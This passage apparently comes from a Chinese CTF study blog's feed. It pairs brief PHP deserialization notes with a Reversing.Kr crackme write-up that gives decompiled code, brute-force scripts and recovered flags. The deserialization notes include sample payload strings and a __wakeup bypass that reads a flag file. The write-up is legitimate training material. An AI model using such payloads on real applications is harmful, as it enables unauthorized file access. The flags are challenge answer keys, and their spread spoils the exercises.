class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ol><li>__construct(): 类的构造函数</li><li>__destruct(): 类的析构函数</li><li>__call(): 在对象中调用一个不可访问方法时调用</li><li>__sleep(): 执行serialize()时会先调用这个函数</li><li>__wakeup(): 执行unserialize()时 会先调用这个函数</li><li>__toString(): 类被当作字符串时的回应方法</li><li>__invoke(): 以调用函数的方式调用一个对象时的回应方法</li><li>__get(): 当访问私有属性或者不存在的属性时触发</li></ol><p>具体触发条件直接上php官方手册查即可</p><h3 id="wakeup-绕过-CVE-2016-7124"><a href="#wakeup-绕过-CVE-2016-7124" class="headerlink" title="__wakeup()绕过 CVE-2016-7124"></a>__wakeup()绕过 CVE-2016-7124</h3><p>PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10 时<br>当序列化字符串中 如果表示对象属性个数的值大于真实属性个数时就会跳过__wakeup()的执行</p><p>比如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line">改为</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line">就可以绕过</span><br></pre></td></tr></table></figure><h2 id="php-Session"><a href="#php-Session" class="headerlink" title="php Session"></a>php Session</h2><p>学习资料:</p><ol><li><a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyGQO40IjNqG8DIxrD&alichlgref=https://cn.bing.com/#toc-10">+</a></li></ol><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>学习资料:</p><ol><li><a href="https://paper.seebug.org/680/" target="_blank">+</a></li></ol><h2 id="php-GC垃圾回收机制-绕过"><a href="#php-GC垃圾回收机制-绕过" class="headerlink" title="php GC垃圾回收机制 绕过"></a>php GC垃圾回收机制 绕过</h2><p>用来提前触发__destruct方法</p><p>学习资料:</p><ol><li><a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/Qb5uDfrxAoT7/7DIrD&alichlgref=https://www.bing.com/"> + </a></li></ol><h2 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h2><p>学习资料:</p><ol><li><a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjiG88YG=eNddzK4D&alichlgref=https://www.bing.com/">+</a></li></ol><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE-waf-绕过"><a href="#RCE-waf-绕过" class="headerlink" title="RCE waf 绕过"></a>RCE waf 绕过</h2><ol><li><a href="https://www.freebuf.com/articles/web/330736.html">+</a></li></ol><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>学习资料:</p><ol><li><a href="https://www.52hertz.tech/2020/02/13/xxe_basic/">+</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41&poc_token=HHXrq2WjeTzuOA0hGXCzS8aYI-9nCq5r3AIrbsRu">++</a></li><li><a href="https://www.leavesongs.com/PENETRATION/slim3-xxe.html">+++</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF-Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Reversing.Kr练习</title>
      <link href="/Reversing-Kr%E7%BB%83%E4%B9%A0/"/>
      <url>/Reversing-Kr%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>慢慢做… 都是偏实战类型的 扩宽点知识面</p><span id="more"></span><h1 id="Easy-CrackMe"><a href="#Easy-CrackMe" class="headerlink" title="Easy_CrackMe"></a>Easy_CrackMe</h1><p>IDA打开 一搜字符串 定位congratulations 对比字符串<br>得到 Ea5yR3versing</p><h1 id="Easy-Keygen"><a href="#Easy-Keygen" class="headerlink" title="Easy_Keygen"></a>Easy_Keygen</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_4011B9</span>(aInputName);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; v3 &lt; (<span class="type">int</span>)<span class="built_in">strlen</span>(v8); ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= <span class="number">3</span> )</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%s%02X&quot;</span>, Buffer, v8[v3++] ^ v7[i - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="built_in">sizeof</span>(v8));</span><br><span class="line"><span class="built_in">sub_4011B9</span>(aInputSerial);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, Buffer) )</span><br><span class="line">  <span class="built_in">sub_4011B9</span>(aCorrect);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">sub_4011B9</span>(aWrong);</span><br></pre></td></tr></table></figure><p>这里动调看看v7 v7[-1~1]:0x10,0x20,0x30<br>注意这里的sprintf是%02x 所以最后的序列号5B134977135E7D13<br>要转为 [0x5b,0x13,0x49,0x77,0x13,0x5e,0x7d,0x13]<br>对应xor回去即可<br>flag: K3yg3nm3</p><h1 id="EasyELF"><a href="#EasyELF" class="headerlink" title="EasyELF"></a>EasyELF</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_804A021 != <span class="number">49</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">byte_804A020 ^= <span class="number">0x34</span>u;</span><br><span class="line">byte_804A022 ^= <span class="number">0x32</span>u;</span><br><span class="line">byte_804A023 ^= <span class="number">0x88</span>u;</span><br><span class="line"><span class="keyword">if</span> ( byte_804A024 != <span class="number">88</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( byte_804A025 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( byte_804A022 != <span class="number">124</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( byte_804A020 == <span class="number">120</span> )</span><br><span class="line">  <span class="keyword">return</span> byte_804A023 == <span class="number">-35</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>对应xor回去就行了 注意byte_804A023这里负数用C unsigned char来写<br><strong>L1NUX</strong></p><h1 id="CSHOP"><a href="#CSHOP" class="headerlink" title="CSHOP"></a>CSHOP</h1><p>C#程序 直接dnspy可以找到可以字符串<br>但是加了反混淆 把变量名做了处理 而且应该给的也是乱序<br>可以找到相关button大小的地方 但是直接修改编译过不了 所以dnspy目前行不通<br>学到了另一种<del>奇技淫巧</del><br>用SpyLite窗口句柄查看器<br>直接找到子窗口列表后改button大小 改大点 点击即可看到flag</p><p><strong>P4W6RP6SES</strong></p><hr><hr><p>以后再来看看 能不能反混淆+算法逆向 或者dnspy直接patch</p><h1 id="HateIntel"><a href="#HateIntel" class="headerlink" title="HateIntel"></a>HateIntel</h1><p>终于有道偏ctf的题了(被干碎了…)<br>IDA一拖 楽 ARM指令集 IDA反编译不了<br>但是 我们有Ghidra~ 🎉🎉🎉<br>Ghidra打开<br>主函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined4 <span class="title">FUN_00002224</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> acStack_64 [<span class="number">80</span>];</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  local_14 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">FUN_0000264c</span>(<span class="string">&quot;Input key : &quot;</span>);</span><br><span class="line">  <span class="built_in">FUN_00002670</span>(<span class="string">&quot;%s&quot;</span>,acStack_64);</span><br><span class="line">  local_10 = <span class="built_in">FUN_0000267c</span>(acStack_64);</span><br><span class="line">  <span class="built_in">FUN_0000232c</span>(acStack_64,local_14);</span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (local_10 &lt;= local_c) &#123;</span><br><span class="line">      <span class="built_in">FUN_00002664</span>(<span class="string">&quot;Correct Key! &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (acStack_64[local_c] != (&amp;DAT_00003004)[local_c]) <span class="keyword">break</span>;</span><br><span class="line">    local_c = local_c + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">FUN_00002664</span>(<span class="string">&quot;Wrong Key! &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析下各个函数<br>FUN_0000264c: cout<br>FUN_00002670: cin<br>FUN_0000267c: strlen</p><p>首先可以注意到最后的循环逐字节check<br>那么我们可以在内存中提取出00003004处的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">44</span> f6 f5 <span class="number">57</span> f5 c6 <span class="number">96</span> b6 <span class="number">56</span> f5 <span class="number">14</span> <span class="number">25</span> d4 f5 <span class="number">96</span> e6 <span class="number">37</span> <span class="number">47</span> <span class="number">27</span> <span class="number">57</span> <span class="number">36</span> <span class="number">47</span> <span class="number">96</span> <span class="number">03</span> e6 f3 a3 <span class="number">92</span></span><br></pre></td></tr></table></figure><p>接下来关注加密函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FUN_0000232c</span><span class="params">(<span class="type">int</span> param_1,<span class="type">int</span> param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined uVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; param_2; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (local_10 = <span class="number">0</span>; iVar2 = <span class="built_in">FUN_0000267c</span>(param_1), local_10 &lt; iVar2; local_10 = local_10 + <span class="number">1</span>)  &#123;</span><br><span class="line">      uVar1 = <span class="built_in">FUN_00002494</span>(*(undefined *)(local_10 + param_1),<span class="number">1</span>);</span><br><span class="line">      *(undefined *)(local_10 + param_1) = uVar1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面传入的param_2&#x3D;4 里面还有一个加密函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">uint <span class="title">FUN_00002494</span><span class="params">(byte param_1,<span class="type">int</span> param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  local_10 = (uint)param_1;</span><br><span class="line">  <span class="keyword">for</span> (local_c = <span class="number">0</span>; local_c &lt; param_2; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">    local_10 = local_10 &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((local_10 &amp; <span class="number">0x100</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">      local_10 = local_10 | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_10 &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逻辑都比较清晰 懒得推导 直接爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;44 f6 f5 57 f5 c6 96 b6 56 f5 14 25 d4 f5 96 e6 37 47 27 57 36 47 96 03 e6 f3 a3 92&quot;</span></span><br><span class="line">enc = enc.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">enc = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> enc]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    c = enc[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        x = j</span><br><span class="line">        <span class="keyword">for</span> v14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            x = x&lt;&lt;<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(x&amp;<span class="number">0x100</span>!=<span class="number">0</span>):</span><br><span class="line">                x |= <span class="number">1</span></span><br><span class="line">            x &amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span>(x==c):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Do_u_like_ARM_instructi0n?:)</span></span><br></pre></td></tr></table></figure><p><strong>flag: Do_u_like_ARM_instructi0n?:)</strong></p><hr><hr><p>做完后怼了怼ARM汇编 勉强也能看 但还是Ghidra方便 (为什么看有的师傅IDA可以F5呐？)<br>我怀疑当年出题人是没想到现在工具这么强大了😄</p><h1 id="Multiplicative"><a href="#Multiplicative" class="headerlink" title="Multiplicative"></a>Multiplicative</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: JavaCrackMe  reason: default package */</span></span><br><span class="line"><span class="comment">/* loaded from: JavaCrackMe.jar:JavaCrackMe.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaCrackMe</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> <span class="comment">/* bridge */</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Reversing.Kr CrackMe!!&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;The idea came out of the warsaw&#x27;s crackme&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (Long.decode(strArr[<span class="number">0</span>]).longValue() * <span class="number">26729</span> == -<span class="number">1536092243306511225L</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Please enter a 64bit signed int&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这涉及到signed __int64的溢出问题<br>就当复习计组了<br>将-1536092243306511225转为它的补码形式<br>1110101010101110101101000011111001000111011110111000010010000111<br>发现还是不能整除<br>再思考 注意到乘数26729比较大 所以可能溢出不止一位 只要保证溢出截断后的低64位一样即可<br>所以我们可以爆破前面的数<br>这里写的比较丑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">s = <span class="string">&quot;1110101010101110101101000011111001000111011110111000010010000111&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> trange(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                                    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                                        <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                                                ss = <span class="built_in">str</span>(a)+<span class="built_in">str</span>(b)+<span class="built_in">str</span>(c)+<span class="built_in">str</span>(d)+<span class="built_in">str</span>(e)+<span class="built_in">str</span>(f)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(h)+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)+<span class="built_in">str</span>(k)+<span class="built_in">str</span>(l)+<span class="built_in">str</span>(m)+<span class="built_in">str</span>(n)+<span class="built_in">str</span>(o)+s</span><br><span class="line">                                                                x = <span class="built_in">int</span>(ss,<span class="number">2</span>)</span><br><span class="line">                                                                <span class="comment"># print(bin(x)[2:])</span></span><br><span class="line">                                                                <span class="keyword">if</span>(x%<span class="number">26729</span>==<span class="number">0</span>):</span><br><span class="line">                                                                    y = x//<span class="number">26729</span></span><br><span class="line">                                                                    <span class="built_in">print</span>(x)</span><br><span class="line">                                                                    <span class="built_in">print</span>(y)</span><br><span class="line">                                                                    <span class="built_in">print</span>(<span class="built_in">hex</span>(y))</span><br><span class="line">                                                                    <span class="built_in">print</span>(long_to_bytes(y))</span><br><span class="line">                                                                    <span class="comment"># exit()</span></span><br></pre></td></tr></table></figure><p>最后爆破得到 y&#x3D;0x83676f67696c676f<br>但是这里发现这个p y也溢出了…<br>所以最后提交 -8978084842198767761</p><h1 id="Easy-Unpackme"><a href="#Easy-Unpackme" class="headerlink" title="Easy_Unpackme"></a>Easy_Unpackme</h1><p>这方面还是学的不怎么扎实<br>题目要求找到OEP<br>IDA硬怼 可以找到这段:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.GWan:<span class="number">0040</span>A1FB ; ---------------------------------------------------------------------------</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB loc_40A1FB:                             ; CODE XREF: start+<span class="number">188</span>↑j</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB                                         ; start+<span class="number">190</span>↑j ...</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB                 jmp     loc_401150</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB start           endp ; sp-analysis failed</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB</span><br><span class="line">.GWan:<span class="number">0040</span>A1FB ;</span><br></pre></td></tr></table></figure><p>这里有个可以跳转 loc_401150 在老前面了 猜测这就是OEP<br>查看loc_401150</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401150</span> loc_401150:                             ; CODE XREF: start:loc_40A1FB↓j</span><br><span class="line">.text:<span class="number">00401150</span>                 jnz     <span class="type">short</span> loc_40110D</span><br><span class="line">.text:<span class="number">00401152</span>                 lodsb</span><br><span class="line">.text:<span class="number">00401153</span>                 cmp     ch, bh</span><br><span class="line">.text:<span class="number">00401155</span>                 dec     eax</span><br><span class="line">.text:<span class="number">00401156</span>                 loopne  loc_401168</span><br><span class="line">.text:<span class="number">00401158</span>                 adc     [eax], dl</span><br><span class="line">.text:<span class="number">0040115</span>A                 dec     eax</span><br><span class="line">.text:<span class="number">0040115B</span>                 sub     al, <span class="number">5</span>Eh ; <span class="string">&#x27;^&#x27;</span></span><br><span class="line">.text:<span class="number">0040115</span>D                 adc     [eax], dl</span><br><span class="line">.text:<span class="number">0040115F</span>                 inc     esp</span><br><span class="line">.text:<span class="number">00401160</span>                 xchg    eax, ecx</span><br><span class="line">.text:<span class="number">00401161</span>                 inc     eax</span><br><span class="line">.text:<span class="number">00401162</span>                 push    eax</span><br><span class="line">.text:<span class="number">00401163</span>                 adc     [eax], ah</span><br><span class="line">.text:<span class="number">00401165</span>                 pusha</span><br><span class="line">.text:<span class="number">00401166</span>                 <span class="keyword">and</span>     al, <span class="number">0</span>D9h</span><br><span class="line">.text:<span class="number">00401168</span></span><br></pre></td></tr></table></figure><p><del>挺像对的</del></p><p>这其实是结合x32dbg搜索汇编指令pushad找到401xxx段 然后再在IDA看反汇编找的<br>x32dbg的反汇编401150处会识别出错…</p><p>真正的方法应该是动调来找 但我真不太会… 抽空再来看吧~</p><h1 id="ImagePrc"><a href="#ImagePrc" class="headerlink" title="ImagePrc"></a>ImagePrc</h1><p>IDA找到这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( wParam == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">GetObjectA</span>(hbm, <span class="number">24</span>, pv);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;bmi, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">      bmi.bmiHeader.biHeight = cLines;</span><br><span class="line">      bmi.bmiHeader.biWidth = v16;</span><br><span class="line">      bmi.bmiHeader.biSize = <span class="number">40</span>;</span><br><span class="line">      bmi.bmiHeader.biPlanes = <span class="number">1</span>;</span><br><span 